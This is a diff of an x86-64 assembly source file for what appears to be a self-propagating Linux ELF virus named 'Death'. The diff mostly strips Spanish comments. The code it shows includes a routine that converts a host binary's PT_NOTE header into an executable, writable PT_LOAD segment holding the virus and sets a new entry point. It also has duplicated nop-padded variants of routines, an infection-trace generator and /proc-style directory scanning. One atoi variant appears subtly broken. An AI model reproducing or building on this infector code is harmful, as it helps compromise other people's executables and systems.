@@ -1388,48 +1388,46 @@ section .text
     __F_crazy_6__end:
 
     __F_mod_pt_note_0:
-        ; Death.note_phdr_ptr es una dirección de memoria que apunta a un puntero
         nop
         lea rax, VAR(Death.note_phdr_ptr)
         mov rax, [rax]
-        mov [rax], dword 0x01                           ; p_type = PT_LOAD
-        mov [rax+Elf64_Phdr.p_flags], dword P_FLAGS     ; P_FLAGS = PF_X | PF_R | PF_W
+        mov [rax], dword 0x01                          
+        mov [rax+Elf64_Phdr.p_flags], dword P_FLAGS    
         mov ecx, dword VAR(Death.file_final_len)
         sub ecx, dword VAR(Death.virus_size)
-        mov [rax+Elf64_Phdr.p_offset], rcx              ; p_offset = file_final_len - virus_size
+        mov [rax+Elf64_Phdr.p_offset], rcx             
         mov VAR(Death.virus_offset), rcx
         mov rcx, VAR(Death.max_vaddr_end)
         ALIGN rcx
-        mov [rax+Elf64_Phdr.p_vaddr], rcx               ; p_vaddr = ALIGN(max_pvaddr_len)
-        mov [rax+Elf64_Phdr.p_paddr], rcx               ; p_paddr = p_vaddr
+        mov [rax+Elf64_Phdr.p_vaddr], rcx              
+        mov [rax+Elf64_Phdr.p_paddr], rcx              
         mov VAR(Death.new_entry), rcx
         mov ecx, dword VAR(Death.virus_size)
-        mov [rax+Elf64_Phdr.p_filesz], rcx              ; p_filesz = virus_size
-        mov [rax+Elf64_Phdr.p_memsz], rcx               ; p_memsz = virus_size
-        mov qword [rax+Elf64_Phdr.p_align], 0x1000      ; p_align = 0x1000 (4KB)
+        mov [rax+Elf64_Phdr.p_filesz], rcx             
+        mov [rax+Elf64_Phdr.p_memsz], rcx              
+        mov qword [rax+Elf64_Phdr.p_align], 0x1000     
         nop
         ret
     __F_mod_pt_note_0__end:
 
     __F_mod_pt_note_1:
-        ; Death.note_phdr_ptr es una dirección de memoria que apunta a un puntero
         lea rax, VAR(Death.note_phdr_ptr)
         mov rax, [rax]
-        mov [rax], dword 0x01                           ; p_type = PT_LOAD
-        mov [rax+Elf64_Phdr.p_flags], dword P_FLAGS     ; P_FLAGS = PF_X | PF_R | PF_W
+        mov [rax], dword 0x01                          
+        mov [rax+Elf64_Phdr.p_flags], dword P_FLAGS    
         mov ecx, dword VAR(Death.file_final_len)
         sub ecx, dword VAR(Death.virus_size)
-        mov [rax+Elf64_Phdr.p_offset], rcx              ; p_offset = file_final_len - virus_size
+        mov [rax+Elf64_Phdr.p_offset], rcx             
         mov VAR(Death.virus_offset), rcx
         mov rcx, VAR(Death.max_vaddr_end)
         ALIGN rcx
-        mov [rax+Elf64_Phdr.p_vaddr], rcx               ; p_vaddr = ALIGN(max_pvaddr_len)
-        mov [rax+Elf64_Phdr.p_paddr], rcx               ; p_paddr = p_vaddr
+        mov [rax+Elf64_Phdr.p_vaddr], rcx              
+        mov [rax+Elf64_Phdr.p_paddr], rcx              
         mov VAR(Death.new_entry), rcx
         mov ecx, dword VAR(Death.virus_size)
-        mov [rax+Elf64_Phdr.p_filesz], rcx              ; p_filesz = virus_size
-        mov [rax+Elf64_Phdr.p_memsz], rcx               ; p_memsz = virus_size
-        mov qword [rax+Elf64_Phdr.p_align], 0x1000      ; p_align = 0x1000 (4KB)
+        mov [rax+Elf64_Phdr.p_filesz], rcx             
+        mov [rax+Elf64_Phdr.p_memsz], rcx              
+        mov qword [rax+Elf64_Phdr.p_align], 0x1000     
         nop
         nop
         ret
@@ -1443,7 +1441,6 @@ section .text
         mov rcx, VAR(Death.file_final_len)
         add rax, rcx
 
-        ; lo transformamos haciendo paranoias
         mov rcx, rax
         shl rcx, 13
         xor rax, rcx
@@ -1456,17 +1453,11 @@ section .text
         shl rcx, 5
         xor rax, rcx
 
-            ; Dejamos el numero de forma que sea representable en chars (decimal) en 8 cifras.
         and rax, 0x3FFFFFF
 
-        ; rdi = buf
-        ; destruye: rax, rbx, rdx, rcx
         add rdi, Traza_len + 1
         add rdi, 8
 
-        ; rcx = contador (para escribir 8 bytes exactos)
-        ; r8 = buffer a escribir el numbero transformado. r8 apunta al final del buffer,
-        ; no al principio. Es porque escribimos del final al principio.
         xor rcx, rcx
         sub rsp, 8
         lea rsi, [rsp+7]
@@ -1474,9 +1465,8 @@ section .text
         mov rcx, 8
         mov rbx, 10
         .convert_loop:
-            ; rax = numerete
             xor rdx, rdx
-            div rbx       ; rax / rbx. rdx = resto.
+            div rbx 
 
             add dl, '0'
             mov [rsi], dl
@@ -1503,7 +1493,6 @@ section .text
         mov rcx, VAR(Death.file_final_len)
         add rax, rcx
 
-        ; lo transformamos haciendo paranoias
         mov rcx, rax
         shl rcx, 13
         xor rax, rcx
@@ -1516,17 +1505,11 @@ section .text
         shl rcx, 5
         xor rax, rcx
 
-            ; Dejamos el numero de forma que sea representable en chars (decimal) en 8 cifras.
         and rax, 0x3FFFFFF
 
-        ; rdi = buf
-        ; destruye: rax, rbx, rdx, rcx
         add rdi, Traza_len + 1
         add rdi, 8
 
-        ; rcx = contador (para escribir 8 bytes exactos)
-        ; r8 = buffer a escribir el numbero transformado. r8 apunta al final del buffer,
-        ; no al principio. Es porque escribimos del final al principio.
         xor rcx, rcx
         sub rsp, 8
         lea rsi, [rsp+7]
@@ -1534,9 +1517,8 @@ section .text
         mov rcx, 8
         mov rbx, 10
         .convert_loop:
-            ; rax = numerete
             xor rdx, rdx
-            div rbx       ; rax / rbx. rdx = resto.
+            div rbx
 
             add dl, '0'
             mov [rsi], dl
@@ -1565,7 +1547,6 @@ section .text
         mov rcx, VAR(Death.file_final_len)
         add rax, rcx
 
-        ; lo transformamos haciendo paranoias
         mov rcx, rax
         shl rcx, 13
         xor rax, rcx
@@ -1578,17 +1559,11 @@ section .text
         shl rcx, 5
         xor rax, rcx
 
-            ; Dejamos el numero de forma que sea representable en chars (decimal) en 8 cifras.
         and rax, 0x3FFFFFF
 
-        ; rdi = buf
-        ; destruye: rax, rbx, rdx, rcx
         add rdi, Traza_len + 1
         add rdi, 8
 
-        ; rcx = contador (para escribir 8 bytes exactos)
-        ; r8 = buffer a escribir el numbero transformado. r8 apunta al final del buffer,
-        ; no al principio. Es porque escribimos del final al principio.
         xor rcx, rcx
         sub rsp, 8
         lea rsi, [rsp+7]
@@ -1596,9 +1571,8 @@ section .text
         mov rcx, 8
         mov rbx, 10
         .convert_loop:
-            ; rax = numerete
             xor rdx, rdx
-            div rbx       ; rax / rbx. rdx = resto.
+            div rbx
 
             add dl, '0'
             mov [rsi], dl
@@ -1618,12 +1592,11 @@ section .text
     __F_set_unique_trace_2__end:
 
     __F_directory_name_isdigit_0:
-        ; rdi = puntero dirent_buffert
         nop
         nop
         push rbx
         lea rsi, [rdi + dirent.d_name]
-        xor rcx, rcx ; contador
+        xor rcx, rcx 
         .bucle:
             mov bl, [rsi + rcx]
             cmp bl, 0
@@ -1643,11 +1616,10 @@ section .text
 
 
     __F_directory_name_isdigit_1:
-        ; rdi = puntero dirent_buffert
         nop
         push rbx
         lea rsi, [rdi + dirent.d_name]
-        xor rcx, rcx ; contador
+        xor rcx, rcx
         .bucle:
             mov bl, [rsi + rcx]
             cmp bl, 0
@@ -1715,13 +1687,13 @@ section .text
         .str_to_int:
             xor rbx, rbx
         .loop:
-            movzx rdx, byte [rsi]   ; cargar caracter
-            test rdx, rdx           ; ¿fin de string?
+            movzx rdx, byte [rsi]   
+            test rdx, rdx           
             jz .done
-            sub rdx, '0'            ; convertir ASCII a número
-            imul rbx, rbx, 10       ; resultado *= 10
-            add rbx, rdx            ; resultado += digito
-            inc rsi                 ; siguiente caracter
+            sub rdx, '0'            
+            imul rbx, rbx, 10       
+            add rbx, rdx            
+            inc rsi                 
             jmp .loop
         .done:
             mov rax, rbx
@@ -1729,17 +1701,16 @@ section .text
     __F_atoi_0__end:
 
     __F_atoi_1:
-        ; rax = resultado
         .str_to_int:
             xor rdx, rdx
         .loop:
-            movzx rbx, byte [rsi]   ; cargar caracter
-            test rbx, rbx           ; ¿fin de string?
+            movzx rbx, byte [rsi]   
+            test rbx, rbx           
             jz .done
-            sub rbx, '0'            ; convertir ASCII a número
-            imul rdx, rbx, 10       ; resultado *= 10
-            add rdx, rbx            ; resultado += digito
-            inc rsi                 ; siguiente caracter
+            sub rbx, '0'            
+            imul rdx, rbx, 10       
+            add rdx, rbx            
+            inc rsi                 
             jmp .loop
         .done:
             mov rax, rdx
